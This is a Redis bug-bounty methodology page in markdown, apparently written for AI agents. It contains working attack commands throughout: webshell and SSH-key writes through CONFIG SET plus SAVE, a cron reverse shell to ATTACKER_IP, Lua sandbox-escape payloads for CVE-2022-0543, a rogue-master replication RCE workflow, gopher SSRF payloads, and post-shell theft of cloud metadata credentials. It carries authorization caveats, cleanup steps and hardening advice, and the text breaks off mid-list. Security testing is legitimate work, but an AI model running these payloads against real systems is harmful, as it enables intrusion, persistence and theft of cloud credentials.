---
technology: Redis
kind: bug-bounty-methodology
audience: ai-agent
version: 1.1
last-refresh: "2026-11-19"
source: "rewritten from HackTricks (network-services-pentesting/6379-pentesting-redis.md), CC BY-NC 4.0, accessed 2026-11-12; unauthorized-instance exploitation-ladder supplement 2026-11-19"
provenance: "hybrid: corpus-grounded (1 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; credit in source line. Exploitation-ladder deep-dive supplement added 2026-11-19 (claude-opus-4-8): Lua-escape lineage, rogue-replication workflow, cloud-metadata pivots, CTF notes — CVEs re-verified against primary advisories"
---

Companion page: [[redis|Redis overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# Redis Bug Bounty Methodology

**Scope:** standalone Redis on TCP/6379 (RESP, optionally TLS), Redis reached through an SSRF pivot, and managed Redis in the cloud. **Out of scope:** other key-value stores (Memcached, Valkey, KeyDB) — similar port, different protocol and tricks.

**Authorization:** everything below presumes written permission. Steps flagged **DESTRUCTIVE** (`SAVE` into a live path, crontab writes, replica flips, `FLUSH*`) can break production. Run them only when the program explicitly permits, capture pre-state first, and always finish with the cleanup block for that step.

## Decision tree (one screen)

1. Port answers `PING` with `+PONG`, no auth → Phase 3 enumeration → capability check (Phase 4) → ladder rung (Phase 6).
2. `-NOAUTH` → Phase 2 (credentials) → then as above.
3. Port unreachable but the app fetches URLs → Phase 5 (SSRF pivot) → re-test auth through the pivot.
4. Managed service (TLS, token, no `CONFIG`) → Phase 7 (cloud context); data-plane findings only, usually.

## Phase 1 — Fingerprinting

RESP is plain text over TCP, so a raw socket is a fully capable client.

```bash
nc -vn 198.51.100.10 6379      # then type: PING<enter>INFO<enter>
redis-cli -h 198.51.100.10 -p 6379 PING     # redis-cli ships in redis-tools
nmap --script redis-info -sV -p 6379 198.51.100.10
```

Read the response shape — it classifies the target in one round trip:

| You send | You get back | Meaning |
|---|---|---|
| `PING` | `+PONG` | Open instance, no auth required |
| `INFO` | `# Server` … `redis_version:7.0.11` … | Free system survey: version, OS, uptime, keyspace, role |
| anything | `-NOAUTH Authentication required.` | Password/ACL exists → Phase 2 |
| anything | error mentioning *protected mode* | Modern default posture; only loopback accepted — pivot via Phase 5 |
| garbage line | `-ERR unknown command 'Host:'` | Protocol is eating an HTTP/SSRF stream → Phase 5 confirmed |

Version leak matters: 4.x/5.x are the rogue-replication golden age; 6.x adds ACLs; 7+ protects `dir`/`dbfilename`/`MODULE` by default; 8.x current. TLS is common on managed deployments (`redis-cli --tls`); a plaintext client against a TLS port returns binary handshake noise — that itself is a fingerprint.

## Phase 2 — Auth probing

```bash
AUTH <password>                    # password-only auth: user is "default"
AUTH <username> <password>         # Redis 6+ ACL user
HELLO 3 AUTH <username> <password> # authenticate and switch to RESP3 in one step
```

Expected replies: `+OK` (valid), `-WRONGPASS invalid username-password pair or user is disabled.` (bad guess), `-NOPERM …` (valid credentials, restricted ACL user — a finding: keep going, the user may still read data).

- There is **no external way** to distinguish password-only from ACL setups before credentials succeed; try both shapes.
- Credential brute force against Redis is allowed by tooling like `hydra` (redis support) or Metasploit's redis scanner modules — keep volume within program rules.
- On Windows targets, a readable `redis.windows-service.conf` (containing `requirepass`/ACL lines) is a local privilege lead only if the service actually loads that file and the recovered secret maps to a more privileged account.
- On hosts you already control: `requirepass` can also be set at runtime (`CONFIG SET requirepass …`) — a post-exploitation persistence trick, and a config to check on every engagement box.

## Phase 3 — Authenticated enumeration

Baseline sweep, in order:

```bash
INFO                  # full dump: Server, Clients, Memory, Persistence, Stats, Replication, Keyspace
INFO keyspace         # which numeric databases hold data, e.g. db0:keys=4, db1:keys=1
CONFIG GET *          # whole runtime config — dir, dbfilename, requirepass, appendonly, maxmemory
client list           # connected clients (other apps = free architecture map)
SLOWLOG GET 25        # 25 slowest commands — app behavior intel
MONITOR               # live command stream (Ctrl-C fast: it blocks nothing, but is noisy)
```

Grab `CONFIG GET dir dbfilename` **first, before any exploitation** — later steps change these values and you need the originals for cleanup.

### Databases and keys

Databases are numbers from 0 (default). Dump per database:

```bash
SELECT 1              # +OK — now on db1
KEYS *                # all keys (SMALL keyspaces only; use SCAN 0 otherwise)
TYPE <key>            # string | list | hash | set | zset | stream
GET <key>             # strings — -WRONGTYPE error means: not a string, check TYPE
LRANGE <key> 0 -1     # lists        HGETALL <key>   # hashes
SMEMBERS <key>        # sets         ZRANGE <key> 0 -1  # sorted sets
DUMP <key>            # serialized fallback for exotic types
```

Prioritize by key names: `session:*`, `token`, `reset:*`, `api*key`, `queue:*`. Session blobs and reset tokens are direct report material.

### ACL and capability recon (Redis 6+)

The real question after login is what the current user may do:

```bash
ACL WHOAMI            # which user this session runs as
ACL USERS             # all defined users
ACL GETUSER default   # command categories, key patterns, pub/sub patterns (7+: selectors)
ACL CAT @dangerous    # what the "dangerous" category includes
COMMAND INFO CONFIG EVAL FUNCTION FCALL REPLICAOF MODULE   # exists? renamed? removed?
MODULE LIST           # loaded extensions
FUNCTION LIST WITHCODE # persisted Lua libraries — may leak business logic or secrets
```

If `ACL GETUSER` is denied, `COMMAND INFO` still reveals renames/removals. Note that admins can `rename-command FLUSHDB ""` — missing commands are themselves a config fingerprint.

### Known escape valves (version-gated, post-auth)

- **CVE-2022-0543** — Debian-packaged Redis with the Lua library still loadable: `EVAL` becomes arbitrary library load → command execution. Check the Debian package revision, not just `redis_version`.
- **CVE-2025-49844 / 46817 / 46818** — Lua engine sandbox escape / integer overflow / cross-user metatable poisoning; fixed in 8.2.2, 8.0.4, 7.4.6, 7.2.11, 6.2.20.
- **CVE-2026-23631 (DarkReplica)** — functions-engine use-after-free: long-running `FCALL` hits the 5s slow-script timeout while a malicious master's `FULLRESYNC` frees the live Lua state; fixed 2026-05-05 in 7.2.14, 7.4.9, 8.2.6, 8.4.3, 8.6.3. Telemetry tell: `FUNCTION`/`REPLICAOF` bursts plus slow-script log entries followed by replication resync.

These are memory-corruption paths — use published PoCs, expect crashes, and treat a crash as a finding, not a finish line.

## Phase 4 — Capability check (before any exploit)

Redis 7+ protects the exact primitives the ladder needs. Test them directly instead of assuming:

```bash
CONFIG GET dir dbfilename appendonly
CONFIG SET dir /tmp              # +OK = runtime file-write is live; error = protected
MODULE LIST                      # any reply = MODULE exists; -ERR = disabled or renamed
MODULE LOAD /tmp/mymodule.so     # works only if enable-module-command was enabled
```

Protection levels can be `no` (open), `yes` (any client), or `local` (loopback/Unix socket only). If remote access is refused but an SSRF can reach `127.0.0.1:6379` (Phase 5), a `local` policy still falls to the pivot.

## Phase 5 — The SSRF pivot

Why this works: Redis reads the stream line by line, replies `-ERR unknown command` to lines it does not know, and keeps the connection. No handshake, no headers. Any request generator that can emit newlines can drive it:

- **CRLF injection in a URL** — path/parameter carrying `%0D%0A`-encoded commands (the classic GitLab 11.4.7 shape: an import-URL SSRF plus `%0D%0A` injection spoke to the internal Redis and poisoned a work queue for code execution — study it as the archetype).
- **gopher:// URLs** — purpose-built for raw streams; Gopherus generates Redis payloads (webshell, shell, SSH key formats).
- **HTTP POST or header bodies** where you control raw bytes reaching the target's egress.

Target addresses worth trying: `127.0.0.1:6379`, `[::1]:6379`, the IPv6-mapped `[0:0:0:0:0:ffff:127.0.0.1]:6379` (bypasses naive "localhost" string filters), and VPC-internal addresses from earlier recon.

Validation: the app's SSRF response or an out-of-band signal returning `-ERR unknown command 'Host:'` spray confirms the protocol is being spoken. From here, every Phase 6 rung is just lines of text.

## Phase 6 — Exploitation ladder

All rungs share the same primitive — write a key's bytes to a chosen path via `CONFIG SET dir` + `CONFIG SET dbfilename` + `SAVE`. Pre-state first: `CONFIG GET dir dbfilename`, and know the web root or user homes before you start.

### 6.1 Webshell (needs web root path)

```bash
redis-cli -h 198.51.100.10
> CONFIG SET dir /usr/share/nginx/html     # +OK   (any web-accessible dir)
> CONFIG SET dbfilename shell.php          # +OK
> SET webshell "<?php system($_REQUEST['c']); ?>"   # +OK
> SAVE                                     # +OK  DESTRUCTIVE: overwrites that file
```

Why it works: the dumped RDB is mostly binary, but PHP scans the whole file for `<?php` and emits leading garbage as output. Test: `GET /shell.php?c=id` over the web app. If the write lands but the shell errors, binary bytes may have broken it — a clean test needs an empty database (DESTRUCTIVE; backup/restore around it).

**Cleanup:** `DEL webshell`; `CONFIG SET dir <original_dir>`; `CONFIG SET dbfilename <original>`; note the file itself persists on disk until an admin removes it — report it.

### 6.2 SSH authorized_keys (needs user home writable by redis)

```bash
ssh-keygen -t rsa -f ./key
(echo -e "\n\n"; cat ./key.pub; echo -e "\n\n") > spaced_key.txt   # blank lines shield the key from RDB junk
cat spaced_key.txt | redis-cli -h 198.51.100.10 -x SET ssh_key    # -x reads value from stdin → +OK
redis-cli -h 198.51.100.10 CONFIG SET dir /var/lib/redis/.ssh     # +OK  (or /home/<user>/.ssh if writable)
redis-cli -h 198.51.100.10 CONFIG SET dbfilename authorized_keys  # +OK
redis-cli -h 198.51.100.10 SAVE                                   # +OK  DESTRUCTIVE
ssh -i ./key redis@198.51.100.10                                  # login as the redis service user
```

SSH's parser skips malformed lines, which is why the surrounding blank lines make the injected key usable.

**Cleanup:** `DEL ssh_key`; restore `dir`/`dbfilename`; **remove the injected line from authorized_keys via the gained shell** (`sed -i '/attackers-key-comment/d' ~/.ssh/authorized_keys` style) — leaving it is a persistence artifact you must report and undo.

### 6.3 Crontab persistence (needs cron to run as a writable-spool user)

```bash
echo -e "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/8888 0>&1'\n\n" \
  | redis-cli -h 198.51.100.10 -x SET cronjob        # +OK
redis-cli -h 198.51.100.10 CONFIG SET dir /var/spool/cron/crontabs   # Debian/Ubuntu; CentOS/RHEL: /var/spool/cron
redis-cli -h 198.51.100.10 CONFIG SET dbfilename root               # username = file name
redis-cli -h 198.51.100.10 SAVE                                     # +OK  DESTRUCTIVE
```

Catch the callback on `ATTACKER_IP` (`nc -lvp 8888`). Same blank-line logic as 6.2: cron skips junk lines.

**Cleanup:** `DEL cronjob`; restore config; remove the cron line through the gained access — a forgotten cron entry is a standing callback and a report item, not a leftover.

### 6.4 MODULE LOAD → native code execution (needs a .so on target disk)

```bash
> MODULE LIST                        # confirm module subsystem answers
> MODULE LOAD /tmp/mymodule.so       # +OK — module registers new commands (e.g. system.exec)
> system.exec "id"                   # "uid=0(root) gid=0(root) groups=0(root)\n" — runs as the redis process user
> system.rev ATTACKER_IP 9999        # module-provided reverse shell, if built in
```

The upload problem: a compiled module (RedisModules-ExecuteCommand is the reference builder) must already be on the target filesystem — via the 6.1 webshell, any other file-write primitive, or a readable share. Redis 7+ disables `MODULE LOAD` unless `enable-module-command` was set (Phase 4 told you).

**Cleanup:** `MODULE UNLOAD mymodule`; delete the `.so` from disk through whatever access placed it there; report the loaded-then-unloaded window honestly.

### 6.5 REPLICAOF rogue-master RCE (Redis 4.x/5.x sweet spot)

Point the victim at a master you control; it will pull a malicious full-sync payload from you:

```bash
redis-cli -h 198.51.100.10 REPLICAOF ATTACKER_IP 6379   # +OK — victim connects OUT to you
# On ATTACKER_IP, run redis-rogue-server: it serves the malicious RDB/module transfer and
# hands back an interactive or reverse shell on compatible 4.x/5.x targets:
./redis-rogue-server.py --rhost 198.51.100.10 --lhost ATTACKER_IP
```

Manual variant: run your own Redis on `ATTACKER_IP`, `SET` payloads as the master, and the victim ingests them. **DESTRUCTIVE:** the full resync can replace the victim's dataset.

**Cleanup:** `redis-cli -h 198.51.100.10 REPLICAOF NO ONE` (restores standalone — legacy `SLAVEOF NO ONE` on old builds); verify with `INFO replication` that `role:master` is back; assess/report any data replaced during sync.

### Ladder selection

| Situation | Rung |
|---|---|
| Web root known, web server on same host | 6.1 webshell |
| redis user home / writable user homes | 6.2 SSH key |
| Host runs cron as root, spool writable | 6.3 crontab (highest impact, most persistence-shaped) |
| Any prior file write on disk | 6.4 MODULE LOAD |
| Nothing writable reachable, version ≤5.x | 6.5 REPLICAOF rogue master |
| Redis 7+ hardened, remote | Re-check Phase 4 via SSRF loopback; else enumerate data only |

## Phase 7 — Managed cloud context (ElastiCache and friends)

Managed Redis (AWS ElastiCache, Azure Cache for Redis, GCP Memorystore) changes the ladder:

- **Network position:** VPC-/private-endpoint-only by default; you reach it through a compromised host or an SSRF inside the estate, not the internet.
- **Config surface:** runtime `CONFIG SET` is unavailable (ElastiCache manages parameters via parameter groups); `MODULE` is gone; the file-write ladder collapses.
- **What remains:** the data plane. Tokens, sessions, and cached application state are still one valid credential away — and an SSRF from the web tier to the cache endpoint still reads them.
- **Auth posture:** access keys/tokens are typically enforced and TLS is the default — credential and token handling mistakes (secrets in repos, over-permissive IAM policies on the cache) become the finding class.
- Report shape: data exposure and credential scope, not RCE — unless the managed offering's compatability mode re-enables commands it should not.

## Phase 8 — Defense and validation notes

For each finding, validate cause not just symptom:

- **Unauthenticated access:** show `INFO` output plus one sensitive `GET` — version + data class in one screenshot pair.
- **File-write RCE:** show the `CONFIG SET`/`SAVE` exchange and the resulting file/shell, then the cleanup. An unchanged webroot after "successful" exploitation means the write went elsewhere — `CONFIG GET dir` again.
- **SSRF pivot:** capture the `-ERR unknown command 'Host:'` response as protocol-level proof.
- **Detection telemetry defenders should have (and you should note avoiding):** `CONFIG GET`/`CONFIG SET` on dir/dbfilename, `MODULE` commands, `REPLICAOF`/`SLAVEOF`, `FUNCTION`/`FCALL` bursts, `MONITOR` sessions, spike in `SLOWLOG` entries, replication resync events, new keys with PHP/Lua/cron-looking values.
- **Hardening recommendations for the report:** set `requirepass` or ACL users; keep protected mode on; bind to specific interfaces; `rename-command` on `CONFIG`/`MODULE`/`FLUSHALL` with random equivalents (and say honestly that renaming is fingerprintable); keep Redis off version 4.x/5.x; run the process as an unprivileged user with no writable web/cron/spool paths; network-segment it from the web tier.

## Appendix A — Tooling

- **redis-cli** (package `redis-tools`) — the primary client; `-h`, `-p`, `-a`/`--user` for auth, `-n` to select a database, `-x` to read the last argument from stdin, `--tls` for encrypted deployments.
- **nc / ncat / socat** — raw RESP probing; enough for PING/INFO/error-shape fingerprinting with zero dependencies.
- **nmap** — `redis-info` NSE script plus `-sV` for service/version detection during network discovery.
- **curl + gopher://** — raw-stream SSRF delivery into Redis; **Gopherus** generates ready-made gopher payloads (webshell, reverse shell, SSH key).
- **Metasploit** — `auxiliary/scanner/redis/redis_server` for enumeration; meterpreter's post-exploitation tooling applies once a shell exists (meterpreter in prose: use it for the post-shell phase, not for Redis itself).
- **redis-rogue-server** — automates the rogue-master replication/module chain (Redis 4.x/5.x) into an interactive or reverse shell.
- **RedisModules-ExecuteCommand** — reference project for compiling a `.so` that adds `system.exec`/`system.rev` commands.
- **redis-dump (npm) / redis-utils (PyPI)** — bulk database export tooling once read access exists.
- References: the official Redis command reference and security docs, and the LZone Redis cheat sheet for enumeration beyond this page.

## Appendix B — Quick reference

```bash
# Fingerprint
nc -vn 198.51.100.10 6379          # then: PING / INFO
nmap --script redis-info -sV -p 6379 198.51.100.10
# Auth
AUTH <password> | AUTH <user> <password> | HELLO 3 AUTH <user> <password>   # +OK / -WRONGPASS / -NOPERM
# Enumerate
INFO keyspace ; CONFIG GET dir dbfilename ; SELECT 1 ; KEYS * ; TYPE <k> ; GET/LRANGE/HGETALL/SMEMBERS <k>
ACL WHOAMI ; ACL GETUSER <u> ; MODULE LIST ; FUNCTION LIST WITHCODE ; SLOWLOG GET 25
# Capability probe (Redis 7+)
CONFIG SET dir /tmp ; MODULE LIST ; MODULE LOAD /tmp/x.so
# File-write core (every Phase 6 rung)
CONFIG SET dir <path> ; CONFIG SET dbfilename <file> ; SET <k> <payload> ; SAVE
# Replication RCE + restore
REPLICAOF ATTACKER_IP 6379 ... REPLICAOF NO ONE
# Cleanup skeleton
DEL <payload-key> ; CONFIG SET dir <orig> ; CONFIG SET dbfilename <orig> ; MODULE UNLOAD <mod>
```

## Supplement — unauthorized-instance exploitation ladder, deep dive (added 2026-11-19)

*Source: external research note (November 2026), re-verified against primary advisories (Redis security blog, Rapid7, NVD, Knownsec 404, modracx) at write time. This supplement deepens Phases 3–7 for the single most common Redis finding — an **open, no-auth instance** — with exact payloads, the Lua-escape lineage, the rogue-replication workflow, post-shell cloud pivots, and a CTF-box reading. Nothing above was rewritten; this adds detail the ladder above summarized.*

### S.1 First contact on an open instance — enumeration before exploitation

The whole engagement forks on the first round trip. An instance that answers `PING`→`+PONG` with no `-NOAUTH` is the headline finding on its own; everything below is impact escalation on top of it. Before you touch `CONFIG SET`, pull the free survey — it decides which ladder rung is even reachable and gives you the pre-state you must restore later.

```bash
redis-cli -h 198.51.100.10 INFO server         # redis_version, os, config_file, executable, run_id
redis-cli -h 198.51.100.10 INFO replication     # role:master/slave — a slave can't SAVE where you want
redis-cli -h 198.51.100.10 INFO persistence     # rdb_last_save_time, aof_enabled — SAVE behavior
redis-cli -h 198.51.100.10 CONFIG GET dir       # 1) "dir" 2) "/var/lib/redis"  — the write anchor
redis-cli -h 198.51.100.10 CONFIG GET dbfilename # 1) "dbfilename" 2) "dump.rdb" — SAVE THIS for cleanup
redis-cli -h 198.51.100.10 CONFIG GET save       # "" means RDB snapshots disabled by schedule (SAVE still works on demand)
```

Read the survey as a decision table — it tells you the rung before you spend a single write:

| INFO/CONFIG field | Value | What it unlocks / blocks |
|---|---|---|
| `redis_version` | `4.x`/`5.x` | REPLICAOF rogue-master (S.3) is in range; no ACL layer |
| `redis_version` | `6.x`+ | ACLs may gate `CONFIG`/`MODULE` even on a no-auth default user |
| `os` | `Linux … Debian`/ an `apt`-built string | CVE-2022-0543 Lua escape candidate (S.2) — but confirm the *package* revision |
| `config_file` | a readable path | `redis.conf` may be world-readable via a later shell — leak `requirepass` |
| `executable` | `/usr/bin/redis-server` | the binary's dir hints at distro packaging |
| `dir` + `dbfilename` | anything | **record both verbatim now** — every Phase 6 rung clobbers them |
| `role` | `slave`/`replica` | this node pulls from a master; `SAVE` and writes may be refused or overwritten on next sync |
| `maxmemory-policy` | `noeviction` vs `allkeys-lru` | on an LRU instance your injected key may be *evicted* before `SAVE` — set it with a short TTL-free `SET` and SAVE fast |

Decision point: if `dir` is already the webroot or a user's `.ssh`, you have a one-command write. If `CONFIG GET dir` returns `-ERR unknown command` or `-NOPERM`, `CONFIG` is renamed/ACL-blocked → skip the file-write ladder, go to S.2 (Lua) or S.3 (replication), or settle for data-plane findings.

### S.2 The Lua sandbox escape lineage (EVAL)

Redis ships an embedded Lua interpreter behind `EVAL`/`EVALSHA`. Upstream deliberately strips the dangerous standard libraries (`os`, `io`, `package`, raw `loadfile`) from the scripting sandbox, so a stock `EVAL` *should* be a dead end for RCE. The lineage of findings is every way that sandbox has leaked.

**Probe the sandbox first** — one request tells you whether the dangerous tables survived:

```bash
redis-cli -h 198.51.100.10 EVAL "return tostring(package)" 0   # "nil" = sandbox intact; a table addr = CVE-2022-0543 shape
redis-cli -h 198.51.100.10 EVAL "return tostring(os)" 0        # "nil" expected; non-nil = badly broken build
redis-cli -h 198.51.100.10 EVAL "return redis.call('time')" 0  # confirms EVAL runs at all (not renamed/ACL-blocked)
```

#### CVE-2022-0543 — Debian/Ubuntu packaging escape (CVSS 10.0, CISA KEV)

Not an upstream bug: Debian and Ubuntu build Redis against a **dynamically linked** liblua, and their packaging left the Lua `package` table populated inside the sandbox instead of clearing it. With `package` present, `package.loadlib()` reaches any symbol in any shared object on disk — including `system` in libc — straight out of a sandboxed `EVAL`. Repro characteristics: Debian-packaged Redis roughly 5.0–6.0.x, `EVAL "return tostring(package)" 0` returns a table, not `nil`.

Verified payload (the libc `system` form — most reliable, one call):

```bash
# writes proof to a file; blind (no stdout back), so read it out afterward
redis-cli -h 198.51.100.10 EVAL \
  "local io_l = package.loadlib('/lib/x86_64-linux-gnu/libc.so.6', 'system'); io_l('id > /tmp/redis_poc.txt');" 0
# -> (nil)   on success  — system() returns, no value propagates back
```

The return-output variant (load Lua's own `io` library from liblua, capture stdout — use when you need the result inline rather than a dropped file):

```bash
redis-cli -h 198.51.100.10 EVAL \
  "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); local f = io.popen('id','r'); local r = f:read('*a'); f:close(); return r" 0
# -> "uid=107(redis) gid=114(redis) groups=114(redis)\n"   on success
```

Path hygiene: the `.so` path is architecture- and distro-specific — `/lib/x86_64-linux-gnu/libc.so.6`, `/usr/lib/x86_64-linux-gnu/liblua5.1.so.0`, sometimes `/usr/lib/aarch64-linux-gnu/…`. If the first fails with a load error, the symbol or path is wrong, not the technique. Metasploit automates the search: `exploit/linux/redis/redis_debian_sandbox_escape`.

**Failure signals that are not failures.** The Debian service unit runs with `PrivateTmp=yes`, so `/tmp/redis_poc.txt` written by the Redis process lands in a *private* `/tmp` namespace — it will not appear in the host's real `/tmp`. Verify through the same Redis process (`EVAL … io.popen('cat /tmp/redis_poc.txt')`), not by SSHing in and looking. The unit may also set `MemoryDenyWriteExecute=true`, which crashes payloads that allocate executable memory (some shellcode stagers) while leaving `system()`/`popen()` of on-disk binaries fine — prefer launching existing binaries over in-memory stages.

**Cleanup:** remove the dropped file through the same primitive (`EVAL "os... system('rm -f /tmp/redis_poc.txt')"` via the libc loader); note the sandbox escape itself cannot be "undone" — report it as a package-upgrade requirement (`apt upgrade redis-server` to the fixed `+debXuY` revision).

#### CVE-2025-49844 "RediShell" and the 2025 Lua cluster — memory-corruption lineage

The modern lineage is different in kind: not a packaging slip but **use-after-free in the upstream Lua engine itself**, reachable by any client allowed to run `EVAL`. CVE-2025-49844 (Redis-rated CVSS 10.0; some trackers 9.9) is a ~13-year-old garbage-collector UAF: a crafted Lua script frees a live object the interpreter keeps using, and the attacker grooms the heap into code execution as the Redis process user. It is **authenticated by design** — it needs the ability to run `EVAL`, which an open no-auth instance hands to everyone, collapsing "authenticated" back to "anyone". Companions CVE-2025-46817 (integer overflow), CVE-2025-46818 (cross-user Lua metatable poisoning), and CVE-2025-46819 round out the cluster.

Fixed in **8.2.2, 8.0.4, 7.4.6, 7.2.11, 6.2.20** (and Redis Software 7.22.2-20). Interim mitigation defenders use — and therefore a capability you should test for — is ACL-removing `EVAL`/`EVALSHA`/`FUNCTION` from the default user:

```bash
redis-cli -h 198.51.100.10 ACL GETUSER default   # look for -@scripting / no +eval in the command rules
redis-cli -h 198.51.100.10 EVAL "return 1" 0      # -NOPERM ... 'eval' = scripting is ACL-blocked (mitigation applied)
```

These are memory-corruption paths: use the published PoC against a version you have confirmed in-range, expect the server to crash on a failed groom, and treat a reproducible crash as a reportable DoS finding even when you do not land code execution. As of the Redis advisory no public weaponized exploit was circulating — a clean crash PoC plus the version banner is a complete report.

### S.3 Replication rogue-master RCE — the redis-rogue-server workflow, concrete

Phase 6.5 named this; here is the exact workflow. It is the go-to when `CONFIG` writes are blocked but `REPLICAOF`/`SLAVEOF` and `MODULE LOAD` still answer, and it is the canonical Redis 4.x/5.x (≤ 5.0.5) path. Mechanism: you stand up a **fake Redis master**; you make the victim replicate from it with `REPLICAOF`; during the full resync the rogue master streams a `.so` module as the "RDB", you point the victim's `dbfilename` at a path on its own disk, then `MODULE LOAD` it and call the command it registers.

```bash
# 1. Build the module once (RicterZ RedisModules-ExecuteCommand); forks ship a prebuilt exp.so
git clone https://github.com/n0b0dyCN/redis-rogue-server
cd redis-rogue-server/RedisModulesSDK/exp && make && cd -   # produces exp.so next to the script

# 2. Interactive run — the tool drives REPLICAOF, serves the module, loads it, drops you a prompt
python3 redis-rogue-server.py --rhost 198.51.100.10 --rport 6379 \
                              --lhost ATTACKER_IP --lport 21000 --exp exp.so
# -> [*] Setting master... / [*] Loading module... / [*] Temporary shell ... >>
#    then interactively:  >> id   ->  uid=0(root) gid=0(root)   (runs as the redis process user)
```

Two other tools do the same dance with different ergonomics: **Ridter/redis-rce** (`python3 redis-rce.py -r 198.51.100.10 -L ATTACKER_IP -f exp.so`, supports `-a <password>` for an auth'd-but-weak instance and a one-shot command mode) and Metasploit `exploit/linux/redis/redis_replication_cmd_exec` (set `RHOSTS`, `SRVHOST`, `COMMAND`). Verify the fork's `-h` before trusting a flag — `--server-only` / `-c` differ across forks.

After the module is loaded the victim exposes `system.exec`/`system.rev` directly, so even without the tool's shell:

```bash
redis-cli -h 198.51.100.10 system.exec "id"                 # -> "uid=..."  (popen, up to ~8191 bytes back)
redis-cli -h 198.51.100.10 system.rev ATTACKER_IP 9999      # reverse shell to your listener
```

**DESTRUCTIVE / cleanup:** the full resync can replace the victim's dataset — capture `INFO keyspace` and, if the program allows, a `--rdb` pull of the current dump first. Restore with the full sequence, and verify:

```bash
redis-cli -h 198.51.100.10 MODULE UNLOAD system          # drop the loaded module
redis-cli -h 198.51.100.10 SLAVEOF NO ONE                # (REPLICAOF NO ONE on 5.0+) restore standalone
redis-cli -h 198.51.100.10 INFO replication              # confirm role:master is back
# then delete the dropped exp.so on the victim via the shell you got, and restore dir/dbfilename
```

### S.4 Post-shell pivots — cloud metadata and lateral movement

An RCE rung above lands you a shell as the Redis process user (often `redis`, sometimes `root` in sloppy containers). On cloud infrastructure the highest-value next move is almost never on that host — it is the **instance metadata service**, reachable only from the workload and now reachable through your shell. This is where a "just a cache" finding becomes a cloud-account compromise, and it belongs in the report as the demonstrated impact.

```bash
# via the gained shell (module system.exec, Lua io.popen, or an interactive reverse shell)
# --- AWS: IMDSv1 (no token) — one hop to temporary IAM role creds ---
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/        # -> role name
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>  # -> AccessKeyId / SecretAccessKey / Token

# --- AWS: IMDSv2 (token required) — needs a PUT first, doable from a real shell (not blind SSRF) ---
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# --- GCP (header-gated) / Azure (header + api-version) ---
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

A shell clears the bar IMDSv2 was meant to raise: the token `PUT` that blind SSRF usually cannot perform is trivial from a real command execution context, so IMDSv2 is **not** a mitigation once you have code execution — note that distinction in the report (it changes the customer's remediation from "enable IMDSv2" to "scope the instance role"). Recovered `AccessKeyId`/`SecretAccessKey`/`Token` go to the engagement's evidence store; validate scope with a single read-only call (`aws sts get-caller-identity`) — do not enumerate the account.

Other pivots worth one careful look each from the Redis host, program scope permitting: `redis.conf`/`requirepass` and `~/.ssh` for lateral creds; other internal services the box can reach that the internet cannot (the Redis host is now your SSRF-equivalent vantage point — Elasticsearch:9200, internal admin panels, the K8s API on `:6443`/`:10250` with the service-account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`); and the Redis dataset itself (sessions, tokens) which you already have.

### S.5 Hardening read as attack surface (protected-mode, rename-command)

Each defensive control is also a recon signal — read the posture backwards.

- **protected-mode.** Default `yes` since Redis 3.2: if no `requirepass` and no explicit `bind`, Redis refuses non-loopback clients with a protected-mode error. That error is a fingerprint, not a wall — it means *no auth is configured*, so a loopback-reaching SSRF (Phase 5) or any local foothold hits a wide-open instance. A target that answers remotely **without** a password has protected-mode effectively off (bound to a public interface or explicitly disabled) — already the finding.
- **rename-command.** Admins rename or disable dangerous verbs (`rename-command CONFIG ""`, `rename-command FLUSHALL a1b2…`). The tells: `CONFIG GET` → `-ERR unknown command 'CONFIG'` while `INFO` still works means `CONFIG` was renamed/removed, not that you lack auth. Enumerate what survived with `COMMAND COUNT` / `COMMAND INFO config eval module slaveof replicaof save bgsave` — a renamed command returns empty arity info. Renaming is security-through-obscurity and fingerprintable; if you can read `redis.conf` later, the new names are in it verbatim. Note honestly in the report that renaming raised the bar but did not close the class.
- **ACL (6+).** `ACL WHOAMI`/`ACL GETUSER default` tells you exactly which rungs are reachable before you try them — `-@dangerous`, `-@scripting`, `-@admin` on the default user each remove a branch of this tree.

### S.6 CTF notes — unauthorized Redis is a box genre

Open Redis on 6379 is a recurring HTB/THM/boot2root pattern, and the intended path is usually one of this ladder's rungs. What a CTF rewards differs from a bounty engagement in ways that change your choices:

- **Fastest path first, destructive is fine.** CTF boxes are disposable and have no production data, so the discipline that governs a bounty — pre-state capture, cleanup, single-request restraint — is optional. `FLUSHALL` to get a clean DB for a webshell, overwrite `authorized_keys` outright, flip replication without a backup. Go straight to the rung the box telegraphs.
- **Reading the box for the rung.** Webserver on 80/443 + Redis → **6.1 webshell** (guess the webroot: `/var/www/html`, `/usr/share/nginx/html`); SSH on 22 + a known user (often `redis`) → **6.2 authorized_keys**; a Debian banner + `EVAL` working → **CVE-2022-0543 (S.2)**, frequently the intended one-shot; Redis 4/5 + no file-write → **rogue replication (S.3)**. `CONFIG GET dir` returning a user's home or the webroot is the setter's hint you picked right.
- **The SSRF-to-Redis box.** A web app with an "import from URL" / webhook field and Redis bound to loopback is the classic chain box: `gopher://127.0.0.1:6379/_` payloads (generate with **Gopherus**: `python2 gopherus.py --exploit redis`) carrying the webshell or cron write. The CRLF-over-HTTP variant mirrors the real GitLab 11.4.7 bug.
- **What CTF omits that a bounty requires.** CTFs reward the flag and ignore evidence hygiene, blast radius, and root-cause write-ups — the exact things a bounty report is graded on. The technique transfers; the discipline does not. Do not carry CTF habits (FLUSH, overwrite, no backup) into an authorized engagement.

### S.7 Post-exploitation evidence capture and reporting

For the open-instance-to-RCE chain specifically, capture the minimal proof and stop:

- **The open-door proof:** `redis-cli -h <t> PING` → `+PONG` and one `INFO server` snippet (version + os) in a single screenshot — this alone is the core finding.
